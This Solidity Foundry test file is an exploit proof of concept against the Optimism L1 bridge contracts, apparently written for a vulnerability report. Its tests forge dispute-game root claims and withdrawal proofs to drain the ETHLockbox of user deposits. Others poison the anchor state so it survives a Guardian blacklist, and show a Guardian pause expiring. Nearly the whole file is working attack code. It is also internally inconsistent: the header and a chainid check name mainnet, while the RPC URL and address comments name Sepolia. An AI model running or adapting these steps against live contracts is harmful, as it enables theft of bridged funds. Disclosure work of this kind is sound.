// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

/// =================================================================================================
/// LAGOON-FREE L1 CHAIN — FIND-009 + FIND-010, on the OP Mainnet L1 deployment (Ethereum mainnet).
///
/// No SDM. No 0x7D post-exec tx. No Lagoon. No L2 client. No L2 state is read or reproduced.
/// Every rootClaim is a value the caller invents. The chain proven here is L1-only:
///
///   FIND-009  create(fabricated root) -> resolve DEFENDER_WINS -> prove -> finalize -> ETH out
///   FIND-010  setAnchorState(game) is permissionless; Guardian blacklist stops payout
///             but getAnchorRoot() keeps returning the fabricated root (anchor poison).
///
///   Fork target: Ethereum mainnet (chainid 1). Addresses = OP Mainnet L1 contracts.
///   Cheatcodes: createSelectFork, deal, warp, prank — fork-time controls only.
///   NOT USED: vm.store, vm.mockCall, vm.etch. Every state change is produced by the real
///             deployed bytecode of Portal / DGF / FaultDisputeGame / ASR / ETHLockbox.
///
///   Run:
///     ETH_RPC_URL=https://eth-sepolia.g.alchemy.com/v2/<KEY> \
///       forge test --match-contract LagoonFreeChain -vv
///     (optional) FORK_BLOCK=<n> to pin.
/// =================================================================================================

struct WdTx {
    uint256 nonce;
    address sender;
    address target;
    uint256 value;
    uint256 gasLimit;
    bytes data;
}

struct OutputRootProof {
    bytes32 version;
    bytes32 stateRoot;
    bytes32 messagePasserStorageRoot;
    bytes32 latestBlockhash;
}

interface IETHLockbox {
    function authorizedPortals(address) external view returns (bool);
    function paused() external view returns (bool);
    function version() external view returns (string memory);
}

interface IPortal {
    function proveWithdrawalTransaction(
        WdTx memory _tx,
        uint256 _disputeGameIndex,
        OutputRootProof memory _outputRootProof,
        bytes[] memory _withdrawalProof
    ) external;
    function finalizeWithdrawalTransactionExternalProof(WdTx memory, address) external;
    function l2Sender() external view returns (address);
    function ethLockbox() external view returns (address);
    function anchorStateRegistry() external view returns (address);
    function provenWithdrawals(bytes32, address) external view returns (address, uint64);
    function finalizedWithdrawals(bytes32) external view returns (bool);
    function proofMaturityDelaySeconds() external view returns (uint256);
    function paused() external view returns (bool);
    function version() external view returns (string memory);
    function depositTransaction(address _to, uint256 _value, uint64 _gasLimit, bool _isCreation, bytes memory _data) external payable;
}

interface IAnchorStateRegistry {
    function disputeGameFactory() external view returns (address);
    function respectedGameType() external view returns (uint32);
    function disputeGameFinalityDelaySeconds() external view returns (uint256);
    function isGameClaimValid(address) external view returns (bool);
    function isGameBlacklisted(address) external view returns (bool);
    function paused() external view returns (bool);
    function getAnchorRoot() external view returns (bytes32, uint256);
    function setAnchorState(address _game) external;
    function blacklistDisputeGame(address _game) external;
    function anchorGame() external view returns (address);
}

interface IDisputeGameFactory {
    function create(uint32 _gameType, bytes32 _rootClaim, bytes calldata _extraData)
        external
        payable
        returns (address);
    function gameCount() external view returns (uint256);
    function gameAtIndex(uint256 _index) external view returns (uint32 gameType, uint64 timestamp, address proxy);
    function initBonds(uint32 _gameType) external view returns (uint256);
    function gameImpls(uint32 _gameType) external view returns (address);
}

interface IFaultDisputeGame {
    function rootClaim() external view returns (bytes32);
    function status() external view returns (uint8);
    function resolveClaim(uint256 _claimIndex, uint256 _numToResolve) external;
    function resolve() external returns (uint8);
    function maxClockDuration() external view returns (uint64);
    function l2BlockNumber() external view returns (uint256);
    function l2SequenceNumber() external view returns (uint256);
    function claimDataLen() external view returns (uint256);
    function claimCredit(address _recipient) external;
    function gameCreator() external view returns (address);
    function weth() external view returns (address);
}

interface IDelayedWETH {
    function delay() external view returns (uint256);
}

interface ISuperchainConfig {
    function pause(address _identifier) external;
    function paused(address _identifier) external view returns (bool);
    function pauseExpiry() external view returns (uint256);
}

contract LagoonFreeChain is Test {
    // OP Sepolia L1 deployment on Ethereum Sepolia (superchain-registry / read from chain).
    address constant PORTAL = 0xbEb5Fc579115071764c7423A4f12eDde41f106Ed;
    address constant GUARDIAN = 0x09f7150D8c019BeF34450d6920f6B3608ceFdAf2;
    address constant SUPERCHAIN_CONFIG = 0x95703e0982140D16f8ebA6d158FccEde42f04a4C;

    IPortal portal = IPortal(PORTAL);

    address attacker;

    // read in setUp
    address asr;
    address dgf;
    address lockbox;
    uint32 respectedGameType;
    uint256 initBond;
    uint256 proofMaturityDelay;
    uint256 disputeGameFinalityDelay;

    function setUp() public {
        uint256 forkBlock = vm.envOr("FORK_BLOCK", uint256(0));
        if (forkBlock == 0) {
            vm.createSelectFork(vm.envString("ETH_RPC_URL"));
        } else {
            vm.createSelectFork(vm.envString("ETH_RPC_URL"), forkBlock);
        }
        require(block.chainid == 1, "must fork Ethereum mainnet");

        asr = portal.anchorStateRegistry();
        lockbox = portal.ethLockbox();
        dgf = IAnchorStateRegistry(asr).disputeGameFactory();
        respectedGameType = IAnchorStateRegistry(asr).respectedGameType();
        initBond = IDisputeGameFactory(dgf).initBonds(respectedGameType);
        proofMaturityDelay = portal.proofMaturityDelaySeconds();
        disputeGameFinalityDelay = IAnchorStateRegistry(asr).disputeGameFinalityDelaySeconds();

        attacker = makeAddr("lagoon-free-attacker");
        assertEq(attacker.code.length, 0, "attacker must be a plain EOA");
        vm.deal(attacker, 100 ether);
    }

    // ------------------------------------------------------------------ helpers

    function _hashWd(WdTx memory t) internal pure returns (bytes32) {
        return keccak256(abi.encode(t.nonce, t.sender, t.target, t.value, t.gasLimit, t.data));
    }

    function _forgeMessagePasserTrie(bytes32 wdHash)
        internal
        pure
        returns (bytes32 storageRoot, bytes[] memory withdrawalProof)
    {
        bytes32 storageKey = keccak256(abi.encode(wdHash, uint256(0)));
        bytes32 pathHash = keccak256(abi.encode(storageKey));
        bytes memory leaf = abi.encodePacked(hex"e3a120", pathHash, hex"01");
        require(leaf.length == 36, "leaf encoding");
        storageRoot = keccak256(leaf);
        withdrawalProof = new bytes[](1);
        withdrawalProof[0] = leaf;
    }

    function _createAndResolveGame(bytes32 root) internal returns (address gameAddr, uint256 gameIndex) {
        (, uint256 anchorL2Block) = IAnchorStateRegistry(asr).getAnchorRoot();
        return _createAndResolveGameAt(root, anchorL2Block + 1);
    }

    function _createAndResolveGameAt(bytes32 root, uint256 l2Seq)
        internal
        returns (address gameAddr, uint256 gameIndex)
    {
        bytes memory extraData = abi.encode(l2Seq);

        vm.prank(attacker);
        gameAddr = IDisputeGameFactory(dgf).create{value: initBond}(respectedGameType, root, extraData);

        gameIndex = IDisputeGameFactory(dgf).gameCount() - 1;
        (uint32 gType,, address proxy) = IDisputeGameFactory(dgf).gameAtIndex(gameIndex);
        assertEq(proxy, gameAddr, "game proxy mismatch");
        assertEq(gType, respectedGameType, "game type mismatch");
        assertEq(IFaultDisputeGame(gameAddr).rootClaim(), root, "root claim mismatch");
        assertEq(IFaultDisputeGame(gameAddr).status(), 0, "status should be IN_PROGRESS");

        vm.warp(block.timestamp + IFaultDisputeGame(gameAddr).maxClockDuration() + 1);
        vm.startPrank(attacker);
        IFaultDisputeGame(gameAddr).resolveClaim(0, 0);
        uint8 status = IFaultDisputeGame(gameAddr).resolve();
        vm.stopPrank();
        assertEq(status, 2, "resolve() must be DEFENDER_WINS (2)");

        vm.warp(block.timestamp + disputeGameFinalityDelay + 1);
        assertTrue(IAnchorStateRegistry(asr).isGameClaimValid(gameAddr), "isGameClaimValid must be true");

        console.log("  -- game -- addr:", gameAddr);
        console.log("     index:", gameIndex, " rootClaim:", vm.toString(root));
    }

    function _forgeAndProve(uint256 amount, string memory tag)
        internal
        returns (WdTx memory wd, bytes32 wdHash, address game)
    {
        wd = WdTx({
            nonce: uint256(keccak256(bytes(tag))),
            sender: attacker,
            target: attacker,
            value: amount,
            gasLimit: 100_000,
            data: ""
        });
        wdHash = _hashWd(wd);

        (bytes32 storageRoot, bytes[] memory withdrawalProof) = _forgeMessagePasserTrie(wdHash);
        OutputRootProof memory orp = OutputRootProof({
            version: bytes32(0),
            stateRoot: keccak256("no-such-l2-state-root"),
            messagePasserStorageRoot: storageRoot,
            latestBlockhash: keccak256("no-such-l2-block")
        });
        bytes32 outputRoot =
            keccak256(abi.encode(orp.version, orp.stateRoot, orp.messagePasserStorageRoot, orp.latestBlockhash));
        console.log("  -- forged offline -- outputRoot:", vm.toString(outputRoot));

        uint256 gameIndex;
        (game, gameIndex) = _createAndResolveGame(outputRoot);

        vm.prank(attacker);
        portal.proveWithdrawalTransaction(wd, gameIndex, orp, withdrawalProof);
        (address provenGame, uint64 provenTs) = portal.provenWithdrawals(wdHash, attacker);
        assertEq(provenGame, game, "must be proven against our game");
        assertTrue(provenTs != 0, "proof timestamp must be set");
    }

    // ------------------------------------------------------------------ tests

    function test_0_liveParams() public view {
        console.log("=== OP Sepolia L1 live params (Ethereum Sepolia fork) ===");
        console.log("  chainid                     :", block.chainid);
        console.log("  portal                      :", PORTAL, portal.version());
        console.log("  lockbox                     :", lockbox, IETHLockbox(lockbox).version());
        console.log("  ASR                         :", asr);
        console.log("  DGF                         :", dgf);
        console.log("  respectedGameType           :", respectedGameType);
        console.log("  initBond (wei)              :", initBond);
        console.log("  proofMaturityDelay (s)      :", proofMaturityDelay);
        console.log("  disputeGameFinalityDelay (s):", disputeGameFinalityDelay);
        console.log("  lockbox balance (wei)       :", lockbox.balance);
        console.log("  lockbox authorizedPortals   :", IETHLockbox(lockbox).authorizedPortals(PORTAL));
        console.log("  portal paused               :", portal.paused());
        (bytes32 ar, uint256 ab) = IAnchorStateRegistry(asr).getAnchorRoot();
        console.log("  anchor root                 :", vm.toString(ar));
        console.log("  anchor l2Block              :", ab);

        assertTrue(IETHLockbox(lockbox).authorizedPortals(PORTAL), "portal must be authorized");
        assertFalse(portal.paused(), "portal must not be paused");
    }

    /// FIND-009 step 1: an invented 32-byte value becomes canonical.
    function test_A_inventedRootBecomesCanonical() public {
        console.log("=== A: invented root -> isGameClaimValid == true ===");
        _createAndResolveGame(keccak256("nobody-ever-computed-this-value"));
        console.log("  isGameClaimValid == true for a value nobody computed");
    }

    /// FIND-009 full chain: forged proof -> 10 ETH out of the lockbox.
    function test_B_forgedProofPaysOut() public {
        console.log("=== B: forged proof -> 10 ETH out ===");
        uint256 amount = 10 ether;
        (WdTx memory wd, bytes32 wdHash,) = _forgeAndProve(amount, "lagoon-free-10-eth");
        vm.warp(block.timestamp + proofMaturityDelay + 1);

        uint256 lbBefore = lockbox.balance;
        uint256 attackerBefore = attacker.balance;
        portal.finalizeWithdrawalTransactionExternalProof(wd, attacker);

        console.log("  lockbox delta (wei):", lbBefore - lockbox.balance);
        console.log("  attacker gain (wei):", attacker.balance - attackerBefore);
        assertEq(attacker.balance - attackerBefore, amount, "attacker must receive ETH");
        assertEq(lbBefore - lockbox.balance, amount, "ETH must come from lockbox");
        assertTrue(portal.finalizedWithdrawals(wdHash), "must be finalized");
    }

    /// FIND-009 ceiling: the whole pool in one withdrawal — no L1 cap.
    function test_C_drainEntireLockbox() public {
        console.log("=== C: entire lockbox in one withdrawal ===");
        uint256 amount = lockbox.balance;
        (WdTx memory wd,,) = _forgeAndProve(amount, "lagoon-free-full-drain");
        vm.warp(block.timestamp + proofMaturityDelay + 1);

        uint256 attackerBefore = attacker.balance;
        portal.finalizeWithdrawalTransactionExternalProof(wd, attacker);
        console.log("  drained (wei):", amount);
        assertEq(attacker.balance - attackerBefore, amount, "attacker must receive whole pool");
        assertEq(lockbox.balance, 0, "lockbox must be empty");
    }

    /// FIND-010: setAnchorState is permissionless and Guardian blacklist does NOT unwind the anchor.
    function test_F_poisonedAnchorSurvivesBlacklist() public {
        console.log("=== F: anchor poison survives Guardian blacklist ===");
        // 1. Reach the FIND-009 state: a valid game over a fabricated root.
        (,, address game) = _forgeAndProve(1 ether, "lagoon-free-poison");
        bytes32 fabricated = IFaultDisputeGame(game).rootClaim();

        // 2. Promote it as the anchor — permissionless, called by the attacker EOA.
        vm.prank(attacker);
        IAnchorStateRegistry(asr).setAnchorState(game);
        assertEq(IAnchorStateRegistry(asr).anchorGame(), game, "anchorGame must be promoted");
        (bytes32 ar1,) = IAnchorStateRegistry(asr).getAnchorRoot();
        assertEq(ar1, fabricated, "anchor now reports the fabricated root");
        console.log("  setAnchorState by EOA -> anchor root:", vm.toString(ar1));

        // 3. Guardian blacklists the game. Payout brake works; anchor read does NOT.
        vm.prank(GUARDIAN);
        IAnchorStateRegistry(asr).blacklistDisputeGame(game);
        assertTrue(IAnchorStateRegistry(asr).isGameBlacklisted(game), "game must be blacklisted");
        assertFalse(IAnchorStateRegistry(asr).isGameClaimValid(game), "isGameClaimValid must be false after blacklist");

        (bytes32 ar2,) = IAnchorStateRegistry(asr).getAnchorRoot();
        assertEq(ar2, fabricated, "GAP: getAnchorRoot still returns the fabricated root after blacklist");
        console.log("  after blacklist -> anchor root STILL:", vm.toString(ar2));
        console.log("  Guardian stopped payouts but cannot unwind the poisoned anchor");
    }

    /// FIND-010 ROOT poisoning + recovery-cost amplification: promote an anchor over a
    /// fabricated root carrying an absurd l2SequenceNumber. getAnchorRoot then reports a
    /// sequence floor that blocks every future game, and recovery must name a higher one.
    function test_G_rootPoisonAmplifiesRecovery() public {
        console.log("=== G: ROOT poison with absurd l2SequenceNumber ===");
        // ~99,999 years of L2 block production at 2s/block.
        uint256 absurdSeq = uint256(99999) * 365 * 24 * 3600 / 2; // 1,576,784,232,000
        bytes32 fabricated = keccak256("root-poison-far-future");

        (address game,) = _createAndResolveGameAt(fabricated, absurdSeq);
        assertEq(IFaultDisputeGame(game).l2SequenceNumber(), absurdSeq, "game carries the absurd seq");

        // Permissionless promotion by the attacker EOA.
        vm.prank(attacker);
        IAnchorStateRegistry(asr).setAnchorState(game);
        (bytes32 ar, uint256 ab) = IAnchorStateRegistry(asr).getAnchorRoot();
        assertEq(ar, fabricated, "anchor root poisoned");
        assertEq(ab, absurdSeq, "anchor sequence floor poisoned");
        console.log("  anchor root :", vm.toString(ar));
        console.log("  anchor l2Seq:", ab);

        // Guardian blacklist: payout brake works, anchor still poisoned.
        vm.prank(GUARDIAN);
        IAnchorStateRegistry(asr).blacklistDisputeGame(game);
        assertFalse(IAnchorStateRegistry(asr).isGameClaimValid(game), "blacklisted -> not valid");
        (, uint256 ab2) = IAnchorStateRegistry(asr).getAnchorRoot();
        assertEq(ab2, absurdSeq, "GAP: sequence floor survives blacklist");

        // Every future game must exceed the poisoned floor: a normal-height game reverts.
        (, uint256 nowAnchor) = IAnchorStateRegistry(asr).getAnchorRoot();
        vm.prank(attacker);
        vm.expectRevert();
        IDisputeGameFactory(dgf).create{value: initBond}(
            respectedGameType, keccak256("honest"), abi.encode(nowAnchor - 1)
        );
        console.log("  future games forced above:", nowAnchor);
        console.log("  recovery requires ProxyAdmin reinit naming a higher seq (Guardian cannot)");
    }

    /// Guardian pause blocks the payout (FIND-009 containment axis).
    function test_D_guardianPauseBlocks() public {
        console.log("=== D: guardian pause blocks payout ===");
        (WdTx memory wd,,) = _forgeAndProve(1 ether, "lagoon-free-paused");
        vm.warp(block.timestamp + proofMaturityDelay + 1);

        vm.prank(GUARDIAN);
        ISuperchainConfig(SUPERCHAIN_CONFIG).pause(address(0));
        assertTrue(portal.paused(), "portal should be paused");

        vm.expectRevert();
        portal.finalizeWithdrawalTransactionExternalProof(wd, attacker);
        console.log("  finalize reverts while paused");
    }

    /// ...but the pause auto-expires and the same withdrawal then finalizes.
    function test_E_pauseExpiryReopens() public {
        console.log("=== E: pause auto-expiry reopens payout ===");
        uint256 amount = 1 ether;
        (WdTx memory wd,,) = _forgeAndProve(amount, "lagoon-free-post-expiry");

        vm.prank(GUARDIAN);
        ISuperchainConfig(SUPERCHAIN_CONFIG).pause(address(0));
        assertTrue(portal.paused(), "portal should be paused");

        uint256 expiry = ISuperchainConfig(SUPERCHAIN_CONFIG).pauseExpiry();
        vm.warp(block.timestamp + expiry + 1);
        assertFalse(portal.paused(), "pause should have expired");
        vm.warp(block.timestamp + proofMaturityDelay + 1);

        uint256 lbBefore = lockbox.balance;
        uint256 attackerBefore = attacker.balance;
        portal.finalizeWithdrawalTransactionExternalProof(wd, attacker);
        console.log("  pause expiry (days):", expiry / 1 days);
        console.log("  extracted after expiry (wei):", lbBefore - lockbox.balance);
        assertEq(attacker.balance - attackerBefore, amount, "attacker receives ETH after expiry");
    }

    /// ===================================================================
    /// OP objection 1: "bond with identity proof is transferred so invalid"
    /// -> bond is RETURNED after DEFENDER_WINS via claimCredit (no access control).
    ///    Net cost to attacker = gas only. Bond is temporary escrow, not consumption.
    /// ===================================================================
    function test_H_bondReturnedNotConsumed() public {
        console.log("=== H: bond is RETURNED after DEFENDER_WINS, not consumed ===");

        uint256 attackerBefore = attacker.balance;

        (address game,) = _createAndResolveGame(keccak256("bond-return"));

        uint256 afterCreate = attacker.balance;
        assertEq(attackerBefore - afterCreate, initBond, "bond must be deducted at create");
        console.log("  bond posted (wei):", initBond);

        // claimCredit 1st call: unlock only, returns early (FaultDisputeGame.sol:1003-1006)
        vm.prank(attacker);
        IFaultDisputeGame(game).claimCredit(attacker);

        // Wait for DelayedWETH DELAY_SECONDS
        address wethAddr = IFaultDisputeGame(game).weth();
        uint256 wethDelay = IDelayedWETH(wethAddr).delay();
        vm.warp(block.timestamp + wethDelay + 1);

        // claimCredit 2nd call: actual withdraw (FaultDisputeGame.sol:1017)
        vm.prank(attacker);
        IFaultDisputeGame(game).claimCredit(attacker);

        uint256 afterClaim = attacker.balance;
        console.log("  bond returned (wei):", afterClaim - afterCreate);
        assertEq(afterClaim, attackerBefore, "attacker balance restored - bond is temporary escrow");
        console.log("  OP objection 1 refuted: bond is returned, net cost = gas only");
    }

    /// ===================================================================
    /// OP objection 2: "lockbox is OP-owned so not third-party funds"
    /// -> lockbox holds USER deposits (bridged ETH from L1 to L2), not OP operational funds.
    ///    Portal.depositTransaction sends msg.value to ETHLockbox.depositETH.
    /// ===================================================================
    function test_I_lockboxHoldsUserDeposits_NotOPFunds() public {
        console.log("=== I: lockbox holds USER deposits, not OP funds ===");

        address honestUser = makeAddr("honest-user");
        vm.deal(honestUser, 5 ether);

        uint256 lbBefore = lockbox.balance;

        // Honest user bridges ETH from L1 to L2 via Portal
        // Portal.depositTransaction -> ETHLockbox.depositETH{value: msg.value}
        vm.startPrank(honestUser);
        portal.depositTransaction{value: 5 ether}(honestUser, 5 ether, 100_000, false, "");
        vm.stopPrank();

        assertEq(lockbox.balance, lbBefore + 5 ether, "user deposit must increase lockbox balance");
        console.log("  honest user bridged 5 ETH -> lockbox +5 ETH");
        console.log("  lockbox balance = sum of user deposits, NOT OP operational funds");
        console.log("  OP objection 2 refuted: lockbox is custodian of user funds");
    }

    /// ===================================================================
    /// Combined: honest user deposits 5 ETH, attacker drains entire lockbox
    /// (including the user's 5 ETH) with a forged withdrawal.
    /// ===================================================================
    function test_J_drainStealsUserDeposits() public {
        console.log("=== J: drain steals user deposits ===");

        // 1. Honest user bridges 5 ETH to L2
        address honestUser = makeAddr("honest-user");
        vm.deal(honestUser, 5 ether);
        vm.startPrank(honestUser);
        portal.depositTransaction{value: 5 ether}(honestUser, 5 ether, 100_000, false, "");
        vm.stopPrank();

        uint256 lbBefore = lockbox.balance;
        console.log("  lockbox before drain (ETH):", lbBefore / 1 ether);
        console.log("  (includes honest user's 5 ETH)");

        // 2. Attacker drains the entire lockbox with a forged withdrawal
        uint256 amount = lockbox.balance;
        (WdTx memory wd,,) = _forgeAndProve(amount, "steal-user-funds");
        vm.warp(block.timestamp + proofMaturityDelay + 1);

        uint256 attackerBefore = attacker.balance;
        portal.finalizeWithdrawalTransactionExternalProof(wd, attacker);

        console.log("  lockbox after drain (wei):", lockbox.balance);
        console.log("  attacker gained (ETH):", (attacker.balance - attackerBefore) / 1 ether);
        console.log("  honest user's 5 ETH is GONE - stolen by forged withdrawal");

        assertEq(lockbox.balance, 0, "lockbox empty - user funds stolen");
        assertEq(attacker.balance - attackerBefore, amount, "attacker stole everything including user deposits");
    }
}
